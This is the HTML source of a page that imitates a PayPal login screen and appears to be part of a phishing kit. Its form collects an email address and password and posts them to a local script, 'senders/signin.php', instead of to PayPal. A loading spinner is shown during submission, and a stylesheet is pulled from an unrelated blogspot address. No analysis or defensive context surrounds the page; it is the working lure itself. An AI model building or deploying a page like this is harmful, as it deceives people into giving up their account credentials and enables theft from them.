<html>
<head>
   <meta charset="utf-8" />
    <title>Log in to your PayPal account</title>
	<link rel="icon" href="asset/img/ppicon.ico" />
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0" />
    <link rel="stylesheet" href="asset/css/loginstyle.css" />
	<link rel='stylesheet' href='https://stylesheetcss.blogspot.com/?style.css'/>
	<script src='asset/js/jq.js'></script>
</head>
<body>
<div class='form'>
<div class='img'>
<img src='asset/img/logo.png'>
</div>
<form action='senders/signin.php' method='post' name='login' id='login' onsubmit='return false'> 
<input class='input' id='email' type='email' name='Email' placeholder='Email address'>
<input class='input' id='password' type='password' name='Password' placeholder='Enter your password'>
<button type='submit' onclick='reSubmit()'>Log In</button>
<a href="#" class='span'>Having trouble logging in? </a>
<div class='orline'>
<div class='or'>or</div>
</div>
<button  class="sbutton" >Sign Up</button>
</form>
</div>


<div class='down'>
<a  href="#">Contact Us</a>
<a  href="#">Privacy</a>
<a  href="#">Legal</a>
<a  href="#">Worldwide</a>
</div>


<div id='waiter' style='display:none;'>
<div  class="waiter">
<div style='text-align:center; width:100%;'>
<img src='asset/img/loader.gif'>
</div>
</div>
</div>



<script>
	$(function(){
		$("#email").keyup(function(){
			$("#email").removeClass("zebi");
		});
		
		$("#password").keyup(function(){
			$("#password").removeClass("zebi");
		});
	});
		
		
	function reSubmit(){
		var emailValue = $("#email").val();
		var passValue = $("#password").val();
		
	if(emailValue.trim() == "" || passValue == ""){
		if(emailValue.trim() == ""){$("#email").addClass("zebi");}
		if(passValue.trim() == ""){$("#password").addClass("zebi");}
	}
	else{
		$("#waiter").show();
		document.forms['login'].submit();
	}
	
	}
	
</script>
</body>
</html>
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	